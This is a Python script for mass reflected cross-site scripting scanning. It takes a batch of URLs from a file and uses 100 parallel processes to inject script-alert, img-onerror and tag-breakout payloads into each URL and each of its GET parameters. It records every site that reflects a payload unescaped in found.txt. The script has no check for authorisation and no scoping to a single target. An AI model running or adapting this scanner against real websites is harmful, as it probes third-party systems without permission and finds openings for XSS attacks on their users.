#!/usr/bin/env python

import requests, random
from multiprocessing import Pool


urls = []

attackPatterns_ = [
    ('"><script>alert(\'XSS\');</script>', '"><script>alert(\'XSS\');</script>'),
    ('--><script>alert(\'XSS\');</script><!--', '--><script>alert(\'XSS\');</script><!--'),
    ('\'><script>alert(\'XSS\');</script><!--', '\'><script>alert(\'XSS\');</script><!--'),
    ('\'\';!--"<AEgHKsikgaE>=&{()}', '<AEgHKsikgaE>'),
    ('<img src=0 onerror=alert(1)>', '<img src=0 onerror=alert(1)>'),
    ('--><script>alert(\'XSS\');</script>', '--><script>alert(\'XSS\');</script>')
]

attackPatterns = [
    ('\'><bafbcbeeecf>', '<bafbcbeeecf>'),
    ('\"><bafbcbeeecf>', '<bafbcbeeecf>'),
    ('--><bafbcbeeecf>', '<bafbcbeeecf>'),
    ('><bafbcbeeecf>', '<bafbcbeeecf>'),
    ('<bafbcbeeecf>', '<bafbcbeeecf>'),
    (';<bafbcbeeecf>', '<bafbcbeeecf>'),
    ('\'\'><bafbcbeeecf>', '<bafbcbeeecf>'),
    ('!--<bafbcbeeecf>', '<bafbcbeeecf>'),
    ('"<bafbcbeeecf>', '<bafbcbeeecf>'),
    ('\'<bafbcbeeecf>', '<bafbcbeeecf>'),
    (';><bafbcbeeecf>', '<bafbcbeeecf>'),
]


class Url:

    def parseParameters(self, url):
        params = {}
        protocol = ''
        domain = ''
        path = ''

        if '?' in url:
            url = url[url.find('?') + 1:]
            
            for p in url.split('&'):
                if '=' in p:
                    params[p.split('=')[0]] = p.split('=')[1]

        return params

    def __init__(self, url):
        if 'https://' in url:
            url = url[8:]
            self.protocol = 'https://'
        elif 'http://' in url:
            url = url[7:]
            self.protocol = 'http://'
        else:
            try:
                requests.get('https://' + url)
                self.protocol = 'https://'
            except requests.RequestException:
                try:
                    requests.get('http://' + url)
                    self.protocol = 'http://'
                except requests.RequestException:
                    self.protocol = ''

        if '/' in url:
            self.domain = url[:url.find('/')]
            if '?' in url:
                self.path = url[url.find('/'):url.find('?')]
            else:
                self.path = url[url.find('/'):]
        else:
            self.domain = url
            self.path = ''

        self.parameters = self.parseParameters(url)

    def getParameterString(self):
        buf = '?'
        for (key, value) in self.parameters.items():
            buf += key + '=' + value + '&'

        return buf[:-1]

    def getUrl(self):
        return self.protocol + self.domain + self.path + self.getParameterString()

    def setParamters(self, p):
        for (key, value) in p.items():
            self.parameters[key] = value


class Result:
    def __init__(self, url):
        self.url = url
        self.successfullPatterns = []

    def addSuccessPatterns(self, pattern):
        self.successfullPatterns.append(pattern)

    def getSuccessPatterns(self):
        return self.successfullPatterns

    def getUrl(self):
        return self.url


def attack(url):
    res = Result(url.domain + url.path)
    print(url.getUrl())

    # attack plain get url
    for ap in attackPatterns:
        try:
            r = requests.get(url.getUrl() + ap[0], timeout=10)
            if ap[1] in r.text:
                res.addSuccessPatterns(url.getUrl() + ap[0])
                break
        except:
            pass

    # attack get parameters        
    if len(url.parameters.items()) != 0:
        for ap in attackPatterns:
            injectedParameters = {}
            try:
                for key, _ in url.parameters.items():
                    injectedParameters[key] = ap[0]
                url.setParamters(injectedParameters)

                r = requests.get(url.getUrl(), timeout=10)

                if ap[1] in r.text:
                    res.addSuccessPatterns(url.getUrl())
                    break
            except:
                pass

    return res


def main():
    res = []

    with open('urls.txt', 'r', encoding="utf-8", errors="surrogateescape") as infile:
        urls = [u.rstrip() for u in infile.readlines()[5000:6000]]

    with Pool(processes=100) as pool:
        res = pool.map(attack, [Url(url) for url in urls])

    buf = ''
    for r in res:
        if r.getSuccessPatterns() != []:
            buf += '+\t' + r.getUrl()
            buf += " patterns:\n"
            for p in r.getSuccessPatterns():
                buf += p + '\n'

            buf += '--------------------------------------\n'

    with open('found.txt', 'a') as f:
        f.write(buf)


if __name__ == '__main__':
    main()
